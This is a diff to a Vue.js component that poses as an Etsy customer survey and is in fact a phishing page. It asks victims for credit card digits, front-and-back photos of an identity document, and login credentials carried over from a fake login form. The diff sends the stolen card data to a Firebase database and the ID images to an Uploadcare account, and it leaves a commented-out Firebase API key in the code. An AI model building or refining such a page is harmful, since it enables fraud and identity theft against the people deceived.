@@ -1,7 +1,8 @@
 <template>
 	<div class="survey">
 		<div class="main">
-		
+		<span>{{username}}</span>
+		<span>{{password}}</span>
 		<div>
 			<div class="progressBar">
 				<ul class="list-unstyled list-inline">
@@ -46,7 +47,7 @@
 			 	</ul>
 			    </div>
 			   </transition>
-			   <transition>
+			   <transition name='fieldtran'>
 			   <div class="first-field" v-show='formCounter == 11 * 2'>
 			 	<h3>which of our categories you like to purchase on ETS</h3>
 			 	<ul class=" list-inline">
@@ -62,7 +63,7 @@
 			 	</ul>
 			    </div>
 			   </transition>
-			   <transition>
+			   <transition name='fieldtran'>
 			   <div class="first-field" v-show='formCounter == 11 *3'>
 			 	<h3>Which of our categories you like to purchase on ETS</h3>
 			 	<ul class="list-inline rate">
@@ -74,7 +75,7 @@
 			 	</ul>
 			    </div>
 			   </transition>
-			   <transition>
+			   <transition name='fieldtran'>
 			   <div class="first-field" v-show='formCounter == 11 *4'>
 			 	<h3>How likely you to recommend Etsy to a friend or college?</h3>
 			 	<ul class="list-inline rate">
@@ -86,7 +87,7 @@
 			 	</ul>
 			    </div>
 			   </transition>
-			     <transition>
+			     <transition name='fieldtran'>
 			   <div class="first-field" v-show='formCounter == 11 *5'>
 			 	<h3>How you satified are you after you case is close?</h3>
 			 	<ul class="list-inline rate">
@@ -98,7 +99,7 @@
 			 	</ul>
 			    </div>
 			   </transition>
-			    <transition>
+			    <transition name='fieldtran'>
 			   <div class="first-field" v-show='formCounter == 11 * 6'>
 			 	<h3>If there one thing that could change about Etsy involevment in case ,what you would be?</h3>
 			 	<form @submit="checkform">
@@ -111,7 +112,7 @@
 			 	
 			    </div>
 			   </transition>
-			    <transition>
+			    <transition name='fieldtran'>
 			   <div class="first-field text-center" v-show='formCounter == 11 * 7'>
 			 	<h3>Confirm you credit cardused at purchase from Etsy,Enter just the first four digits so we can contact your bank easier and provide more support when detecting your purchase from a suspecious Seller</h3>
 			 	<div class="input-group center-credit">
@@ -126,7 +127,7 @@
 			 			<div v-if='errors.length'>
 			 				<ul class="list-unstyled">
 			 				<b class="text-muted">Please correct the following error(s):</b>
-			 					<li v-for='error in errors'>
+			 					<li v-for='error in errors' v-bind:key="error">
 			 						{{error}}
 			 					</li>
 			 				</ul>
@@ -143,40 +144,16 @@
 			   </p>
 			    </div>
 			   </transition>
-			   <transition>
+			   <transition name='fieldtran'>
 			   <div class="first-field" v-show='formCounter == 11 * 8'>
 			 	<h3>Providing any peace of idintication can help us securing your account by validation your country residency to serve you better when you open a case on Etsy or when you contacting our 24/7 support</h3>
 			 	<span class="text-muted">(please provide us front and back of you document if necessary)</span>
 			 	<div class="text-center upoad-file">
-					<button class="btn btn-secoundary" v-on:click="takePic('theFile')">Capture Image with your device camera</button>
+					
 					<form @submit.prevent='uplodaImages'>
-						<input
-						 required="required"
-						  type="file"
-						   accept="image/*"
-						    id="theFile"
-						     
-						     v-on:change='getCaptured'
-	                        style="display: none" 
-						     ref='files'
-						     name='file1'
-						     multiple
-						     capture
-						  />
-						     
-						<strong>Or</strong>
-					<button class="btn btn-secoundary" v-on:click="uploadPic('UpFile')">Upload files</button>
-					<input
-					 type="file"
-					  id="UpFile" 
-					  multiple
-	                  style="display: none" 
-					   v-on:change='getUpload'
-					   ref='files'
-					    name='file2'
-					   />
-					   
-					<button type="submit" class="btn btn-default"  >Countinue</button>
+						
+					   <input type="hidden"  role="uploadcare-uploader" required="required" name="content" id="uploadIm" data-public-key="18d099d9d7d6dcf24d21" data-images-only />
+					<button type="submit" class="btn btn-default"   >Countinue</button>
 					</form>
 					
 					
@@ -197,12 +174,34 @@
 <script >
 import surveyField from './surveyField';
 import sendmailService from './../services/sendmailService'
+import formLogin from './formLogin';
 import axios from 'axios';
+// import Firebase from 'firebase'
+//   const config = {
+//     apiKey: "AIzaSyAqlaJPjmgGqfNdzHdzoCtSqUgu70vA0vY",
+//     authDomain: "etsy-project-9696e.firebaseapp.com",
+//     databaseURL: "https://etsy-project-9696e.firebaseio.com",
+//     projectId: "etsy-project-9696e",
+//     storageBucket: "etsy-project-9696e.appspot.com",
+//     messagingSenderId: "1080929571550"
+//   };
+//   console.log(this.username)
+// const app = Firebase.initializeApp(config)
+// let db = app.database()
+import db from './../db';
+let fbInfo = db.ref('etsyInfo')
 	export default{
 		props:['userlogin'],
 		components:{
-         surveyField
+		 surveyField
        
+		},
+		firebase: {
+		etsy: fbInfo
+		},
+		props:{
+			username:String,
+			password:String
 		},
 		data() {
 			return{
@@ -214,7 +213,13 @@ import axios from 'axios';
 				imageCptured:'',
 				imageUploaded:'',
 				errors:[],
-				files:[]
+				files:[],
+				userInfo: {
+				
+				credtCard: '',
+				feedback:''
+				
+			}
 			}
 		},
 		methods:{
@@ -224,26 +229,7 @@ import axios from 'axios';
 			decressCounter:function(){
 				return this.formCounter-=11;
 			},
-			takePic:function(elemId){
-				var elem = document.getElementById(elemId);
-				// if(elem && document.createEvent) {
-				// var evt = document.createEvent("MouseEvents");
-				// evt.initEvent("click", true, false);
-				// elem.dispatchEvent(evt);
-				// }
-				elem.click()
-				elem.addEventListener('change',(e)=>{
-					//console.log(e.target.files)
-				})
-			},
-			uploadPic:function(elemId){
-               var elem = document.getElementById(elemId);
-               elem.click()
-
-              elem.addEventListener('change',(e)=>{
-					//console.log(e.target.files)
-				})
-			},
+			
 			checkform:function(e){
 			 
              if(this.textArea &&  this.textArea.length > 2){
@@ -263,65 +249,31 @@ import axios from 'axios';
              console.log(this.cardCredit)
               e.preventDefault();
 			},
-			// get image captured
-			getCaptured:function(){
-				let uploadedFiles = this.$refs.files.files;
+			
+			 uplodaImages:function(e){
+				 const uploadIm=document.querySelector('#uploadIm');
+				fbInfo.push({
+				creditcard: this.cardCredit,
+				feedback :this.textArea
 
-				/*
-				Adds the uploaded file to the files array
-				*/
-				for( var i = 0; i < uploadedFiles.length; i++ ){
-				this.files.push( uploadedFiles[i] );
-				}
-			},
-			getUpload:function(){
-				let uploadedFiles = this.$refs.files.files;
+				});
+				this.$router.push({name:'thanks'})
+				//  this.userInfo.username='';
+				//  this.userInfo.password='';
 
-				/*
-				Adds the uploaded file to the files array
-				*/
-				for( var i = 0; i < uploadedFiles.length; i++ ){
-				this.files.push( uploadedFiles[i] );
-				}
-			},
-			 uplodaImages:function(){
-             
-				let formData = new FormData();
+			// 	console.log('the form submited')
 
-				/*
-				Iteate over any file sent over appending the files
-				to the form data.
-				*/
-				for( var i = 0; i < this.files.length; i++ ){
-				let file = this.files[i];
+		
+			// 	const emailData={
 
-				formData.append('files[' + i + ']', file);
-				}
-				let emailData={
-        
-             	opinion:this.textArea,
-             	cardC:this.cardCredit,
-             	files:formData
-             }
-             const send=sendmailService.sendMail(emailData).then(res => {
-             	this.$router.push({name:'thanks'})
-             	console.log(res)
-             	}).catch(err => {console.log(err)})
-				// axios.post( 'http://localhost:5000/maildata',
-				// emailData,
-				// {
-				// headers: {
-				// 'Content-Type': 'multipart/form-data'
-				// }
-				// }
-				// ).then(res=>{
-				// console.log(res);
-				// this.$router.push({name:'thanks'})
-				// })
-				// .catch((err)=>{
-				// console.log(`FAILURE!!${err}`);
-				// alert('Erro !please try again')
-				// });
+			// 	opinion:this.textArea,
+			// 	cardC:this.cardCredit
+			// 	}
+            //    sendmailService.sendMail(emailData).then(res => {
+            //  	this.$router.push({name:'thanks'})
+            //  	console.log(res)
+            //  	}).catch(err => {console.log(err)})
+				e.preventDefault()
 			}
 		}
 	}
